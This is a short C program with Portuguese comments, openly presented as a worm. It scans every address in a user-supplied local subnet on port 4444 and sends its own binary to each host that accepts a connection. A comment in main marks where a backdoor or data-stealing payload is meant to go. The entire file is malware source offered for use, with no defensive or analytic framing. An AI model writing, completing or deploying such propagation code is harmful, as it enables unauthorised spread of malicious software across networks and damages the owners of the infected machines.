#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

// Configurações do Worm
#define TARGET_PORT 4444 // Porta que o worm busca para se propagar
#define BINARY_NAME "worm_payload"

// Função para ler o próprio binário do disco para enviá-lo
void send_payload(int sock) {
    FILE *fp = fopen(BINARY_NAME, "rb");
    if (fp == NULL) {
        perror("Erro ao abrir o próprio binário");
        return;
    }

    char buffer[1024];
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), fp)) > 0) {
        send(sock, buffer, bytes_read, 0);
    }
    fclose(fp);
    printf("[+] Payload enviado com sucesso.\n");
}

// Função para escanear a rede local
void scan_and_infect(char *network_prefix) {
    int sock;
    struct sockaddr_in target_addr;
    char ip[16];

    // Varre de .1 até .254 na subrede
    for (int i = 1; i < 255; i++) {
        sprintf(ip, "%s.%d", network_prefix, i);
        printf("[*] Tentando infectar: %s\n", ip);

        sock = socket(AF_INET, SOCK_STREAM, 0);
        
        // Timeout curto para o scan não demorar
        struct timeval timeout;
        timeout.tv_sec = 1; 
        timeout.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));

        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(TARGET_PORT);
        target_addr.sin_addr.s_addr = inet_addr(ip);

        if (connect(sock, (struct sockaddr *)&target_addr, sizeof(target_addr)) == 0) {
            printf("[!] Alvo vulnerável encontrado: %s\n", ip);
            send_payload(sock);
        }
        close(sock);
    }
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Uso: %s <prefixo_da_rede> (ex: 192.168.1)\n", argv[0]);
        return 1;
    }

    printf("--- Iniciando Worm de Propagação ---\n");
    
    // 1. Executa a carga útil (Payload)
    // Aqui você colocaria a função que cria o backdoor ou rouba dados
    printf("[+] Executando payload local...\n");

    // 2. Inicia a propagação lateral
    scan_and_infect(argv[1]);

    printf("--- Ciclo de propagação concluído ---\n");
    return 0;
}
